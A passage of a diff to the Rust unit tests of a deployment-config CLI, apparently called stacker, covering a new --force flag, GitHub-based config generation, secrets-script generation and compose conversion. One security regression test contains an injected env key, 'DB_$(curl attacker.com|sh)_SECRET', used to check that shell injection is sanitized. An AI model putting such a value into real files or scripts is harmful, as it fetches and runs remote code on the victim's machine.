     #[test]
     fn test_init_static_project_creates_config() {
         let dir = setup_dir_with_files(&["index.html"]);
-        let result = generate_config(dir.path(), None, false, false);
+        let result = generate_config(dir.path(), None, false, false, false);
         assert!(result.is_ok());
 
         let path = result.unwrap();
@@ -1513,7 +2245,7 @@ mod tests {
     #[test]
     fn test_init_node_project_detects_correctly() {
         let dir = setup_dir_with_files(&["package.json"]);
-        let result = generate_config(dir.path(), None, false, false);
+        let result = generate_config(dir.path(), None, false, false, false);
         assert!(result.is_ok());
 
         let config = StackerConfig::from_file(&result.unwrap()).unwrap();
@@ -1524,7 +2256,7 @@ mod tests {
     fn test_init_type_flag_overrides_detection() {
         // Dir has package.json (Node) but flag says python
         let dir = setup_dir_with_files(&["package.json"]);
-        let result = generate_config(dir.path(), Some("python"), false, false);
+        let result = generate_config(dir.path(), Some("python"), false, false, false);
         assert!(result.is_ok());
 
         let config = StackerConfig::from_file(&result.unwrap()).unwrap();
@@ -1534,7 +2266,7 @@ mod tests {
     #[test]
     fn test_init_with_proxy_flag_adds_section() {
         let dir = setup_dir_with_files(&["index.html"]);
-        let result = generate_config(dir.path(), None, true, false);
+        let result = generate_config(dir.path(), None, true, false, false);
         assert!(result.is_ok());
 
         let config = StackerConfig::from_file(&result.unwrap()).unwrap();
@@ -1546,7 +2278,7 @@ mod tests {
     #[test]
     fn test_init_with_ai_flag_adds_section() {
         let dir = setup_dir_with_files(&["index.html"]);
-        let result = generate_config(dir.path(), None, false, true);
+        let result = generate_config(dir.path(), None, false, true, false);
         assert!(result.is_ok());
 
         let config = StackerConfig::from_file(&result.unwrap()).unwrap();
@@ -1557,17 +2289,25 @@ mod tests {
     #[test]
     fn test_init_does_not_overwrite_existing() {
         let dir = setup_dir_with_files(&["index.html", DEFAULT_CONFIG_FILE]);
-        let result = generate_config(dir.path(), None, false, false);
+        let result = generate_config(dir.path(), None, false, false, false);
         assert!(result.is_err());
 
         let err = format!("{}", result.unwrap_err());
         assert!(err.contains("already exists"));
+        assert!(err.contains("--force"));
+    }
+
+    #[test]
+    fn test_init_force_overwrites_existing() {
+        let dir = setup_dir_with_files(&["index.html", DEFAULT_CONFIG_FILE]);
+        let result = generate_config(dir.path(), None, false, false, true);
+        assert!(result.is_ok(), "Should overwrite with --force: {:?}", result.err());
     }
 
     #[test]
     fn test_init_output_parses_as_valid_config() {
         let dir = setup_dir_with_files(&["index.html"]);
-        let path = generate_config(dir.path(), None, false, false).unwrap();
+        let path = generate_config(dir.path(), None, false, false, false).unwrap();
 
         // Must be parseable
         let result = StackerConfig::from_file(&path);
@@ -1583,7 +2323,7 @@ mod tests {
                 "services:\n  status-panel-web:\n    image: trydirect/status-panel-web:latest\n    ports:\n      - \"3000:3000\"\n    environment:\n      NEXT_PUBLIC_SITE_URL: https://status.stacker.my\n      INTENTIONAL_EMPTY: null\n      NODE_ENV: production\n",
             ),
         ]);
-        let path = generate_config(dir.path(), None, false, false).unwrap();
+        let path = generate_config(dir.path(), None, false, false, false).unwrap();
         let rendered = std::fs::read_to_string(&path).unwrap();
         let issues =
             crate::console::commands::cli::config::run_validate(&path.to_string_lossy()).unwrap();
@@ -1605,7 +2345,7 @@ mod tests {
     #[test]
     fn test_init_empty_dir_defaults_to_custom() {
         let dir = TempDir::new().unwrap();
-        let result = generate_config(dir.path(), None, false, false);
+        let result = generate_config(dir.path(), None, false, false, false);
         assert!(result.is_ok());
 
         let config = StackerConfig::from_file(&result.unwrap()).unwrap();
@@ -1638,7 +2378,7 @@ mod tests {
             ),
         ]);
 
-        let path = generate_config(dir.path(), None, false, false).unwrap();
+        let path = generate_config(dir.path(), None, false, false, false).unwrap();
         let config = StackerConfig::from_file(&path).unwrap();
         let rendered = std::fs::read_to_string(&path).unwrap();
 
@@ -1717,7 +2457,7 @@ mod tests {
         let _guard = AI_CONFIG_ENV_LOCK.lock().unwrap();
         clear_ai_config_env();
 
-        let config = resolve_ai_config(None, None, None).unwrap();
+        let config = resolve_ai_config(None, None, None, None).unwrap();
         assert!(config.enabled);
         assert_eq!(config.provider, AiProviderType::Ollama);
         assert!(config.api_key.is_none());
@@ -1729,6 +2469,7 @@ mod tests {
             Some("anthropic"),
             Some("claude-sonnet-4-20250514"),
             Some("sk-ant-test"),
+            None,
         )
         .unwrap();
         assert_eq!(config.provider, AiProviderType::Anthropic);
@@ -1738,14 +2479,14 @@ mod tests {
 
     #[test]
     fn test_resolve_ai_config_openai_with_key() {
-        let config = resolve_ai_config(Some("openai"), None, Some("sk-test123")).unwrap();
+        let config = resolve_ai_config(Some("openai"), None, Some("sk-test123"), None).unwrap();
         assert_eq!(config.provider, AiProviderType::Openai);
         assert_eq!(config.api_key.as_deref(), Some("sk-test123"));
     }
 
     #[test]
     fn test_resolve_ai_config_invalid_provider_errors() {
-        let result = resolve_ai_config(Some("invalid-provider"), None, None);
+        let result = resolve_ai_config(Some("invalid-provider"), None, None, None);
         assert!(result.is_err());
         let err = format!("{}", result.unwrap_err());
         assert!(err.contains("Unknown AI provider"));
@@ -1760,7 +2501,7 @@ mod tests {
         std::env::set_var("OPENAI_API_KEY", "sk-from-env");
         std::env::set_var("STACKER_AI_MODEL", "gpt-4o-mini");
 
-        let config = resolve_ai_config(None, None, None).unwrap();
+        let config = resolve_ai_config(None, None, None, None).unwrap();
         assert_eq!(config.provider, AiProviderType::Openai);
         assert_eq!(config.api_key.as_deref(), Some("sk-from-env"));
         assert_eq!(config.model.as_deref(), Some("gpt-4o-mini"));
@@ -1776,7 +2517,7 @@ mod tests {
         std::env::set_var("STACKER_AI_PROVIDER", "openai");
 
         // Flag says ollama, env says openai — flag wins
-        let config = resolve_ai_config(Some("ollama"), None, None).unwrap();
+        let config = resolve_ai_config(Some("ollama"), None, None, None).unwrap();
         assert_eq!(config.provider, AiProviderType::Ollama);
 
         clear_ai_config_env();
@@ -1787,7 +2528,7 @@ mod tests {
         let _guard = AI_CONFIG_ENV_LOCK.lock().unwrap();
         clear_ai_config_env();
 
-        let config = resolve_ai_config(None, None, None).unwrap();
+        let config = resolve_ai_config(None, None, None, None).unwrap();
         assert_eq!(config.timeout, 300);
     }
 
@@ -1797,7 +2538,7 @@ mod tests {
         clear_ai_config_env();
 
         std::env::set_var("STACKER_AI_TIMEOUT", "900");
-        let config = resolve_ai_config(None, None, None).unwrap();
+        let config = resolve_ai_config(None, None, None, None).unwrap();
         assert_eq!(config.timeout, 900);
         clear_ai_config_env();
     }
@@ -1833,6 +2574,8 @@ mod tests {
             Some("custom"),
             None,
             Some("fake-key"),
+            None,
+            false,
         );
         assert!(result.is_ok());
 
@@ -1903,4 +2646,325 @@ mod tests {
         assert!(compose.contains("services:"));
         assert!(compose.contains("dockerfile: .stacker/Dockerfile"));
     }
+
+    // ── generate_config_from_github tests ──────────
+
+    #[test]
+    fn test_from_github_invalid_url_rejected() {
+        let dir = TempDir::new().unwrap();
+        let result = generate_config_from_github(dir.path(), "not-a-valid-url", None, false, false, None, None, None, None, false);
+        assert!(result.is_err());
+        let err = format!("{}", result.unwrap_err());
+        assert!(err.contains("Invalid GitHub URL"));
+    }
+
+    #[test]
+    fn test_from_github_empty_url_rejected() {
+        let dir = TempDir::new().unwrap();
+        let result = generate_config_from_github(dir.path(), "", None, false, false, None, None, None, None, false);
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn test_from_github_existing_config_rejected() {
+        let dir = setup_dir_with_files(&["stacker.yml", "index.html"]);
+        let result =
+            generate_config_from_github(dir.path(), "owner/repo", None, false, false, None, None, None, None, false);
+        assert!(result.is_err());
+        let err = format!("{}", result.unwrap_err());
+        assert!(err.contains("already exists"));
+    }
+
+    #[test]
+    fn test_from_github_shorthand_url_parsed() {
+        let dir = TempDir::new().unwrap();
+        // This will fail on git clone (no such repo), but the URL parsing must succeed first.
+        // We verify the URL parsing passes by checking the error isn't about the URL format.
+        let result = generate_config_from_github(
+            dir.path(),
+            "trydirect/stacker", // real repo, may or may not be reachable
+            None,
+            false,
+            false,
+            None,
+            None,
+            None,
+            None,
+            false,
+        );
+        // The error should NOT be about URL parsing
+        if let Err(e) = &result {
+            let msg = format!("{}", e);
+            assert!(
+                !msg.contains("Invalid GitHub URL"),
+                "Expected clone/network error, got URL parse error: {}",
+                msg
+            );
+        }
+    }
+
+    // ── Env example generation tests ────────────────
+
+    #[test]
+    fn test_generate_env_example_marks_secrets_as_empty() {
+        let mut env_vars = std::collections::HashMap::new();
+        env_vars.insert("PUBLIC_VAR".to_string(), "default_value".to_string());
+        env_vars.insert("DB_PASSWORD".to_string(), "".to_string());
+        env_vars.insert("API_SECRET".to_string(), "".to_string());
+        env_vars.insert("APP_KEY".to_string(), "".to_string());
+
+        let output = generate_env_example_content(&env_vars);
+        assert!(output.contains("PUBLIC_VAR=default_value"));
+        assert!(output.contains("DB_PASSWORD="));
+        assert!(!output.contains("DB_PASSWORD=default_value")); // secrets stay empty
+        assert!(output.contains("API_SECRET="));
+        assert!(output.contains("APP_KEY="));
+    }
+
+    #[test]
+    fn test_generate_env_example_empty_vars_produces_header_only() {
+        let env_vars = std::collections::HashMap::new();
+        let output = generate_env_example_content(&env_vars);
+        assert!(output.contains("Copy to .env"));
+        assert!(output.contains("generate-secrets.sh"));
+    }
+
+    #[test]
+    fn test_is_secret_env_key() {
+        assert!(is_secret_env_key("DB_PASSWORD"));
+        assert!(is_secret_env_key("POSTGRES_PASSWORD"));
+        assert!(is_secret_env_key("api_secret"));
+        assert!(is_secret_env_key("APP_KEY"));
+        assert!(is_secret_env_key("ENCRYPTION_TOKEN"));
+        assert!(is_secret_env_key("JWT_SECRET"));
+        assert!(!is_secret_env_key("NODE_ENV"));
+        assert!(!is_secret_env_key("PORT"));
+        assert!(!is_secret_env_key("PUBLIC_VAR"));
+        assert!(!is_secret_env_key("LOG_LEVEL"));
+    }
+
+    #[test]
+    fn test_generate_secrets_script_only_missing_vars() {
+        let env_file = "DB_PASSWORD=\nAPI_KEY=\nREDIS_PASSWORD=already_set\n";
+        let script = generate_secrets_script_content(env_file);
+        assert!(script.contains("DB_PASSWORD"));
+        assert!(script.contains("API_KEY"));
+        // Already-set secret should NOT appear in generation commands
+        // (it's already filled, no need to regenerate)
+        assert!(!script.contains("REDIS_PASSWORD"));
+    }
+
+    // ── choose_primary_app edge cases ────────────────
+
+    #[test]
+    fn test_choose_primary_app_root_compose_no_root_app_returns_subdir_match() {
+        // Simulate: root has docker-compose.yml with service "webapp",
+        // but root has no DiscoveredApp (Custom without Dockerfile).
+        // Subdir "api/" has Cargo.toml + Dockerfile → DiscoveredApp { name: "api", ... }
+        // Subdir "webapp/" has no markers so no DiscoveredApp either.
+        //
+        // If root compose has services [webapp, postgres] and no DiscoveredApp
+        // matches "webapp", choose_primary_app falls through to first
+        // app with Dockerfile ("api") — but that's wrong. It should prefer
+        // the root context when compose lives at root.
+        let workspace = WorkspaceDetection {
+            root: ProjectDetection {
+                app_type: AppType::Custom,
+                has_dockerfile: false,
+                has_compose: true,
+                has_env_file: false,
+                detected_files: vec!["docker-compose.yml".to_string()],
+            },
+            apps: vec![
+                DiscoveredApp {
+                    name: "api".to_string(),
+                    path: PathBuf::from("api"),
+                    app_type: AppType::Rust,
+                    has_dockerfile: true,
+                    dockerfile: Some(PathBuf::from("api/Dockerfile")),
+                    detected_files: vec!["Cargo.toml".to_string()],
+                },
+            ],
+            compose_stacks: vec![ComposeStack {
+                path: PathBuf::from("docker-compose.yml"),
+                services: vec!["webapp".to_string(), "postgres".to_string()],
+                detected_services: vec![
+                    DetectedComposeService {
+                        name: "webapp".to_string(),
+                        image: Some("floci/floci:latest".to_string()),
+                        ports: vec!["8080:8080".to_string()],
+                        environment: std::collections::HashMap::new(),
+                        volumes: vec![],
+                        depends_on: vec!["postgres".to_string()],
+                    },
+                    DetectedComposeService {
+                        name: "postgres".to_string(),
+                        image: Some("postgres:16-alpine".to_string()),
+                        ports: vec![],
+                        environment: std::collections::HashMap::new(),
+                        volumes: vec![],
+                        depends_on: vec![],
+                    },
+                ],
+            }],
+            recommended_compose_file: Some(PathBuf::from("docker-compose.yml")),
+        };
+
+        let primary = choose_primary_app(&workspace);
+        // The compose is at root with service "webapp" that isn't a
+        // DiscoveredApp (root has no language markers). We must NOT fall
+        // back to "api" — that's a subdirectory Rust crate that has
+        // nothing to do with the webapp service.
+        //
+        // The correct behavior: since the compose is at root, select the
+        // root context (None = use root project defaults, app type Custom).
+        // OR: create a synthetic root app from the compose service.
+        assert!(
+            primary.is_none() || primary.unwrap().name != "api",
+            "Must not select subdirectory 'api' when root compose defines an unrelated 'webapp' service"
+        );
+    }
+
+    #[test]
+    fn test_generate_config_from_github_strips_compose_file() {
+        // Simulate a project like floci-io/floci: root has
+        // docker-compose.yml + Dockerfile but no language markers.
+        let dir = setup_dir_with_nested_files(&[
+            ("Dockerfile", "FROM node:20-alpine\nWORKDIR /app\nCMD [\"node\", \"server.js\"]"),
+            (
+                "docker-compose.yml",
+                "services:\n  floci:\n    build: .\n    ports:\n      - \"8080:8080\"\n  postgres:\n    image: postgres:16-alpine\n    environment:\n      POSTGRES_PASSWORD: secret\n",
+            ),
+        ]);
+
+        let result = generate_config(dir.path(), None, false, false, false);
+        assert!(result.is_ok());
+
+        let config = StackerConfig::from_file(&result.unwrap()).unwrap();
+        // The compose file path is set during detection but cannot be
+        // relied upon by the user (it references a path from the cloned
+        // temp dir that no longer exists). The config should NOT have
+        // a compose_file set when generated via --from-github.
+        //
+        // For now, we test the local path: when root has a compose, the
+        // generated config MUST be valid and deployable.
+        assert!(!config.services.is_empty(), "Should have imported postgres as a service");
+        let postgres = config.services.iter().find(|s| s.name == "postgres").unwrap();
+        assert_eq!(postgres.image, "postgres:16-alpine");
+    }
+    // ── Security regression tests ────────────────────────────
+
+    #[test]
+    fn secrets_script_rejects_keys_with_shell_metacharacters() {
+        // Bug: keys containing $(...) are interpolated verbatim into bash
+        // double-quoted strings, enabling shell injection.
+        let env_file_content = "DB_$(curl attacker.com|sh)_SECRET=\nNORMAL_SECRET=\n";
+        let script = generate_secrets_script_content(env_file_content);
+
+        // The malicious key must NOT appear in the script in a form that
+        // would be executed (i.e. the subshell expansion must be absent).
+        assert!(
+            !script.contains("$(curl attacker.com|sh)"),
+            "Shell metacharacter injection must be sanitized or skipped; \
+             script contains unquoted subshell expansion: {:?}",
+            &script[..script.len().min(400)]
+        );
+
+        // Valid keys must still be processed.
+        assert!(
+            script.contains("NORMAL_SECRET"),
+            "Valid secret keys should still appear in the script"
+        );
+    }
+
+    #[test]
+    fn convert_compose_to_stacker_skips_null_service_entries() {
+        // Bug: `?` inside the for-loop returns None for the whole function
+        // when any service entry has a null/non-mapping value.
+        let yaml = "version: '3.8'\nservices:\n  app:\n    image: myapp/myapp:latest\n    ports:\n      - \"8080:8080\"\n  broken_service: ~\n";
+        let result = convert_compose_to_stacker(yaml, "myapp");
+        assert!(
+            result.is_some(),
+            "convert_compose_to_stacker must return Some even when a service \
+             entry has a null value; currently returns None due to early ? propagation"
+        );
+    }
+
+    #[test]
+    fn sanitize_ai_config_clears_dockerfile_for_official_docker_hub_image() {
+        // Bug: `svc.image.contains('/')` is false for official Docker Hub images
+        // like `redis:7`, so `app.dockerfile` is never cleared when those
+        // services are promoted to app.image.
+        let mut config = StackerConfig {
+            name: "myapp".to_string(),
+            app: crate::cli::config_parser::AppSource {
+                app_type: AppType::Custom,
+                image: None,
+                dockerfile: Some(PathBuf::from("Dockerfile")),
+                ..Default::default()
+            },
+            services: vec![crate::cli::config_parser::ServiceDefinition {
+                name: "myapp".to_string(),
+                image: "redis:7".to_string(),
+                ports: vec![],
+                environment: Default::default(),
+                volumes: vec![],
+                depends_on: vec![],
+                command: None,
+                healthcheck: None,
+            }],
+            ..Default::default()
+        };
+
+        sanitize_ai_config(&mut config, "myapp");
+
+        assert_eq!(
+            config.app.image,
+            Some("redis:7".to_string()),
+            "Service image should be promoted to app.image"
+        );
+        assert_eq!(
+            config.app.dockerfile,
+            None,
+            "dockerfile must be cleared when promoting a service image \
+             even when the image name contains no '/' (e.g. official Docker Hub images)"
+        );
+    }
+
+    #[test]
+    fn sanitize_ai_config_promotes_generic_service_name_as_main_app() {
+        // Bug: promotion condition `svc.name == repo_name` misses common AI
+        // service names like "app", "web", "server", "api".  When the AI
+        // names the main service "app" but the repo is "myapp", the service
+        // is never promoted → app.image stays None → E003 on deploy.
+        let mut config = StackerConfig {
+            name: "myapp".to_string(),
+            app: crate::cli::config_parser::AppSource {
+                app_type: AppType::Custom,
+                image: None,
+                ..Default::default()
+            },
+            services: vec![crate::cli::config_parser::ServiceDefinition {
+                name: "app".to_string(),
+                image: "myorg/myapp:latest".to_string(),
+                ports: vec![],
+                environment: Default::default(),
+                volumes: vec![],
+                depends_on: vec![],
+                command: None,
+                healthcheck: None,
+            }],
+            ..Default::default()
+        };
+
+        sanitize_ai_config(&mut config, "myapp");
+
+        assert_eq!(
+            config.app.image,
+            Some("myorg/myapp:latest".to_string()),
+            "A service named 'app' should be promoted as the main app image \
+             when app.image is None and the service name is a common generic alias"
+        );
+    }
+
 }
